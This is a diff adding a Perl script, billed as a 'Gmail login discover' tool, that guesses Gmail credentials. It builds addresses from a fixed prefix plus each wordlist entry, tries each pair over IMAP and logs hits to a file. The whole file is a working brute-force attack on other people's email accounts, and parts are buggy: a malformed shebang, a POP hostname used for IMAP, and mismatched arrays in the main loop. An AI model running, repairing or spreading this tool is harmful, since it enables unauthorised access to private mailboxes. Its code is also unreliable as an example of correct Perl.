@@ -1,0 +1,76 @@
+#!/usr/bin/env/perl
+use WWW::Mechanize;
+use strict;
+use warnings;
+
+my $logid = 0;
+my (@aa, @a, $i, $wordlist);
+my $mech = WWW::Mechanize->new();
+$mech->get("https://www.gmail.com");
+
+banner();
+init(1);
+system("pause");
+
+sub banner {
+$wordlist = "83_tim_3". ".txt";
+open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";
+print "Gmail login discover - by xandin69\n\n";
+}
+
+sub init {
+for (<*>) { if (!(-f $wordlist)) { print "\nWordlist not found\n"; system("pause"); exit(0);} }
+@a = <LIST>;
+@aa = grep { !/^$/ } @a;
+close (LIST);
+if (shift eq "1") {singlethread();print "Running in 1 thread\n"} else {multithread();} 
+}
+
+sub singlethread {
+$i = 0;
+	for (@a) {
+		print "Trying at $i\ -> ";
+		#print "id : Trying => $aa[$i]";
+		doit($aa[$i]);
+		$i++;
+	}
+}
+
+sub doit {
+my $email = shift;
+read_gmail($email);
+}
+
+sub logit {
+open F, ">>found.txt";
+print F shift;
+close (F);
+$logid += 1;
+}
+
+sub read_gmail {
+use Net::IMAP::Simple;
+use Email::Simple;
+use IO::Socket::SSL;
+		# fill in your details here
+		my $username = "ygoroliveira" . shift . '@gmail.com';
+		my $password = $username;
+		$password =~ s/ygoroliveira//ig;
+		my $mailhost = 'pop.gmail.com';
+		# Connect
+		my $imap = Net::IMAP::Simple->new(
+			$mailhost,
+			port    => 993,
+			use_ssl => 1,
+		) || die "Unable to connect to IMAP: $Net::IMAP::Simple::errstr\n";
+	
+		# Log in
+		if ( !$imap->login( $username, $password ) ) {
+			#print (STDERR "Login failed: " . $imap->errstr . "\n");
+			#exit(64);
+			print "error\n";
+			return 1;
+		}
+		logit($mech->content());
+	$imap->quit;
+}
